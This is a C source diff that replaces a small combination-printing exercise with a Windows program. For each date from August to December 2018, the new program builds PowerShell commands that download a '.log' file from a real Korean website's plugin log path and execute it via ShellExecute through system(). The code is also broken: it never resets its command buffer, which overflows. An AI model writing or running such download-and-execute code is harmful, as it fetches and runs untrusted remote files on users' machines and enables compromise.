@@ -1,16 +1,31 @@
+
+#include <windows.h>
 #include <stdio.h>
-void f(int n, int now, char *str, int len) {
-   if (len) { //맨처음 함수들어왓을때 씹음
-      str[len] = now;
-      for (int i = 1; i <= len; i++) printf("%c", str[i]+'a'-1);
-      printf("\n");
-   }
-   for (int i = now + 1; i <= n; i++) f(n, i, str, len + 1);
-}
+#include <string.h>
+//PowerShell (New-Object System.Net.WebClient).DownloadFile(\'http://www.bravotec.co.kr/plugin/lgxpay/lgdacom/log/log_%d%d%d.log\',\'%d%d%d.log\');(New-Object -com Shell.Application).ShellExecute(\'%d%d%d.log\');
+
+char str[] = "PowerShell (New-Object System.Net.WebClient).DownloadFile(\'http://www.bravotec.co.kr/plugin/lgxpay/lgdacom/log/log_";
+char str2[] = ".log\',\'";
+char str3[] = ".log\');(New-Object -com Shell.Application).ShellExecute(\'";
+char str4[] = ".log\');";
+char command[1000];
+char time[100]; 
 int main() {
-   char str[101] = { 0, }; //배열은 참고로 그 자체가 주소임
-   int n;
-   scanf("%d", &n);
-   f(n, 0, str, 0);
-   return 0;
+	int year=2018, month=8, day=13;
+	for (; month <= 12; month++,day=1) {
+		for (; day <= 31; day++) {
+			sprintf(time, "%d%02d%d", year, month, day);
+         strcat(command,str);
+         strcat(command,time);
+         strcat(command,str2);
+         strcat(command,time);
+         strcat(command,str3);
+         strcat(command,time);
+         strcat(command,str4);
+         strcat(command,time);   
+         printf("%s\n",command);
+			system(command);
+		}
+	}
+	return 0;
 }
